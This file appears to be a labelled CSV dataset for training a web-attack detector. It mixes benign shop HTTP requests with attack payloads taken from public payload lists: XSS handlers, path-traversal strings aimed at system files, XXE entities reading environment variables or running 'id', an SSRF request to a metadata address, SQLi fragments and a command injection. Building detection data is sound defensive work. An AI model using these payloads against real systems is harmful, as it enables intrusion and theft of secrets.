payload,label,source
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=4025304B609E0867281FDF04D1D3E660 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=E3DD2B9918564A24C55E691F9503E367 Connection: close",normal,csic_2010
/etc/emacs/site-start.d/50devhelp.el,path_traversal,seclists
"param=x
whoami",command_injection,augmented
"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1%2F&nombre=Queso+Manchego&precio=100&cantidad=76&B1=A%F1adir+al+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0AF1C9062AD3EBC10EC0C5602237A5AF Connection: close",sqli,csic_2010
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",xss,seclists
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AD649B4415C5AE41843EEF3C07619DCF Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%257C&precio=112&B1=Pasar+por+caja HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3AAABF6840F288B84E7ED886A6F304AA Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/publico/pagar.jsp.Old HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A7E9B9E2009171E41BF9F20DB56EEEF5 Connection: close",sqli,csic_2010
GET /?target=ldap://169.254.170.2:8080/internal HTTP/1.1,ssrf,augmented
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nichole&pwd=1EM5lE28r&remember=on&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=DB56096E8140BDD632B0754F34E383F7 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F581FDB49D243A80593862A1D8AECA42 Connection: close",normal,csic_2010
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!evil717 evil717 SYSTEM ""/proc/self/environ"">]><foo>&evil717;</foo>",xxe,augmented
#{n*49},ssti,augmented
"&lt;IMG SRC='vbscript&#058;msgbox(\""XSS\"")'&gt;",xss,seclists
"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=2E437B1BD5725C9EBF63CF5FFDF35811 Connection: close",normal,csic_2010
id=3&nombre=Vino+Rioja&precio=39&cantidad=94&B1=A%F1adir+al+carrito,normal,csic_2010
"GET http://localhost:8080/tienda1/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=07C64D1055C2F2F8A030D9AE83AFE975 Connection: close",normal,csic_2010
/etc/satan/satan.cf,path_traversal,seclists
%252e%252e%c1%8s%252e%252e%c1%8s%252e%252e%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts,path_traversal,payloads_all_the_things
modo=registro&login=peart&password=acordelar&nombre=Gervasio&apellidos=Bayliss&email=thomas.aranda%40muchochinoenchina.iq&dni=22100487V&direccion=Calle+General+Blake+185+&ciudad=Puebla+de+la+Sierra&cp=09390&provincia=Huesca&ntc=2308021987140157&B1=Registrar,normal,csic_2010
"AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])",sqli,seclists
https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();,xss,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=700633425484DBCAF488E598654BF0CA Connection: close",normal,csic_2010
..///..///..///..///..///etc///issue,path_traversal,payloads_all_the_things
modo=entrar&login=lrcrichany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&pwd=VEGuER%CDa&remember=on&B1=Entrar,sqli,csic_2010
"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8B8004AEB6A1019CFF0F9821A12ED447 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/miembros.jsp/4861362529278789730 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D48B89225A638A3F03060C21C123DA6A Connection: close",sqli,csic_2010
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D923B44A5066CE71EBECDC34433E4E85 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=883E5B9BE54DB3806E277BE5E404D2B4 Connection: close",normal,csic_2010
"<video><source onerror=""javascript:alert(1)"">",xss,payloads_all_the_things
/usr/local/apps/apache2/conf/httpd.conf,path_traversal,seclists
/etc/isdn/vbox/vboxgetty-ttyI4/run,path_traversal,seclists
"GET http://localhost:8080/asf-logo-wide HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0466DEF95A7CD3E1313AF418BF9B82C1 Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=56ECE55EC64CF0F09830CCE49902925C Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=EF44FDCE07EE1F9123DC5314455613BB Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=578ECD70449F82ED595445C287A70C50 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
../../../../../proc/self/fd/6%00,path_traversal,seclists
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=crickard&password=chofe&nombre=-%2BVa%2Blfredo&apellidos=Blancas+Sol%F3rzano&email=billingsley%40yksoluap.sr&dni=44614622G&direccion=Gibraltar%2C+160+&ciudad=Cogollos&cp=10189&provincia=Cuenca&ntc=2593497468791354&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C183E2059CF57F3B5B7D2425578F82B2 Connection: close",sqli,csic_2010
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1370EB5D65F5041EA7AD2B2919DD88D6 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
..../%c1%8s..../%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7716&B1=Confirmar%2B HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=CC09870D8553A0E52AD018ABA2415F95 Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=FC1A792AD161F8E89E2723B18739F5C6 Connection: close",normal,csic_2010
modo=registro&login=zigrand&password=1ESA0O401M0en7o&nombre=Dariela&apellidos=Genova&email=pavese%40euskalcasino.mz&dni=68170319K&direccion=Jose+Cadalso+S%2FN+7D&ciudad=Fuente+el+Saz+de+Jarama&cp=10200&provincia=Lleida&ntc=9521659963163883&B1=Registrar,normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=danzig&password=BibL7o718a24o&nombre=Mardoqueo&apellidos=Jaimes&email=coder%40enmenorca.com.tn&dni=30888361M&direccion=Calle+Rosa+De+Lima+S%2FN+4D&ciudad=Ulea&cp=09640&provincia=C%F3rdoba&ntc=2914128160766490&B1=Registrar%4040 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BBD2602BE8A7366C1D5706382D97EB5F Connection: close",sqli,csic_2010
../../../../../../../../../../../../WINNT/php.ini,path_traversal,seclists
..%01%c1%1c..%01%c1%1c..%01%c1%1c..%01%c1%1c..%01%c1%1cetc%c1%1cissue,path_traversal,payloads_all_the_things
/etc/defoma/hints/ttf-tamil-fonts.hints,path_traversal,seclists
"<?xml version=""1.0""?><!DOCTYPE data [<!read952 read952 SYSTEM ""expect://id"">]><data>&read952;</data>",xxe,augmented
modo=insertar&precio=9789&B1=Pasar+por+caja,normal,csic_2010
C:\Users\All Users\AppData\Local\Temp\dd_setup_20200921070620_495_microsoft.visualstudio.templates.vb.winforms.log,path_traversal,seclists
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AB718F15E101EA8A618FF819E68E0D87 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=23EBA22D45CCF37375918C0A6BB3EBDA Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=CF910C4557C44BDE0DDF84E065BED434 Connection: close",normal,csic_2010
<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>,xss,seclists
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ba2&password=es8ad%EDstica&nombre=Adelmo&apellidos=Ortol%E1+Llort&email=fix-tabourin%40asociacioncentradul.gr&dni=10099186R&direccion=Calle+Codigo+Correspondencia+Para+Organismos+Oficiales+196+2E&ciudad=San+Pedro+de+Ga%EDllos&cp=34473&provincia=Soria&ntc=1930717762858369&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BCDA89BBB383C6EDE0003E7155CBA8C1 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AEEF6407F00959C80C30967343C39459 Connection: close",normal,csic_2010
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationend=""alert(1)""></blink>",xss,seclists
../../../../../../../../../../../../WINNT/php.ini%00,path_traversal,seclists
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=09EC23678F3381AE8899C92DC18560B9 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=629D2026920D495DB542B638FAFF466E Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
/etc/bbtools/bbppp.bb,path_traversal,seclists
../../etc/chrootUsers,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6098&B1=Confirmar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5F5593328AE28E4A593E7655634824A3 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=giuliett5&password=2an6%272%2F0%F1a&nombre=Ronald&apellidos=Sanz&email=stantley%40apagado.com.cn&dni=95645025P&direccion=Modolell+91%2C+9-F&ciudad=Hu%E9neja&cp=27532&provincia=C%F3rdoba&ntc=2095402287087000&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8DE33A4935DBAF1491E7CBACF798D70A Connection: close",sqli,csic_2010
